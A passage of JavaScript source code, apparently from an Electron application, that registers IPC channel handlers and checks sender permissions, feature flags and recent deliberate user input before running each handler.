          }
        }
        if (spec.passSender) {
          handlerArgs = [event.sender, ...handlerArgs]
        }
        return spec.handler(...handlerArgs)
      })
    } else {
      ipcMain.on(channel, (event, ...args) => {
        if (!senderAllowed(event, spec.gate) || !featureAllowed(spec.requires)) return
        if (
          spec.payloadNeedsDeliberateInput &&
          needsDeliberateInputForWrite(args) &&
          !hasRecentDeliberateInput(event.sender)
        ) {
          return
        }
        spec.handler(...(spec.passSender ? [event.sender, ...args] : args))
      })
    }
  }
}
